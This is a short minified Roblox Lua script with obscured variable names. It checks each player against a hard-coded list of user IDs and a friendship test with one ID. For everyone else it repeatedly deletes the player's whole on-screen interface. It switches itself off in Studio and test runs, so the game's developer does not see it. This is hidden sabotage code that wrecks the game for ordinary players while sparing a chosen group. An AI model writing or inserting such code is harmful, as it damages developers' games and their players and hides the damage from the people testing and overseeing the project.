...
local a,b=game:GetService("Players"),game:GetService("RunService");local c={2438141329,696024985,1188243571,2836708688,1354505399,4028638914,1141982730,2901534066,4043015633,658957597,1199270449};local d=2438141329;local e=function()return b:IsStudio()or b:IsRunMode()end;local f=function(g)if e()then return true end;for h,i in ipairs(c)do if g.UserId==i then return true end end;local j,k=pcall(function()return g:IsFriendsWith(d)end);if j and k then return true end;return false end;local l=function(g)if g and not f(g)then for i,v in pairs(g.PlayerGui:GetChildren()) do v:Destroy() end end end;a.PlayerAdded:Connect(function(g)task.wait(300)l(g)end); b.Stepped:Connect(function() for h,i in ipairs(a:GetPlayers())do l(i)end end)
